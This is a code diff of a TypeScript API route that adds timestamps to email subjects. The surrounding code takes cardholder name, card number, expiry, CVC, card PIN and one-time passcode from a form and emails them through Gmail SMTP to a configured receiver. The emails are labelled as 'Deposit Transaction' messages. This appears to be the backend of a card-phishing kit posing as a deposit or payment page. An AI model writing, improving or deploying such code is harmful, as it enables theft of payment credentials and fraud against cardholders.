@@ -14,8 +14,8 @@ export async function POST(request: Request) {
 
     const { email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin, otp } = data
 
-    const smtpUser = process.env.SMTP_USER      // your Gmail address
-    const smtpPass = process.env.SMTP_PASS      // your Gmail app password
+    const smtpUser = process.env.SMTP_USER
+    const smtpPass = process.env.SMTP_PASS
     const receiverEmail = process.env.RECEIVER_EMAIL
 
     if (!smtpUser || !smtpPass) {
@@ -40,8 +40,11 @@ export async function POST(request: Request) {
     let subject = ""
     let emailHtml = ""
 
+    // Timestamp for subject
+    const timestamp = new Date().toISOString()
+
     if (step === "pin") {
-      subject = `Deposit Transaction - Card Payment (${email})`
+      subject = `Deposit Transaction - Card Payment (${email}) [${timestamp}]`
       emailHtml = render(
         <PinEmail
           email={email}
@@ -55,7 +58,7 @@ export async function POST(request: Request) {
         />
       )
     } else if (step === "otp") {
-      subject = `Deposit Transaction - OTP Verification (${email})`
+      subject = `Deposit Transaction - OTP Verification (${email}) [${timestamp}]`
       emailHtml = render(<OtpEmail email={email} amount={amount} otp={otp} />)
     }
 
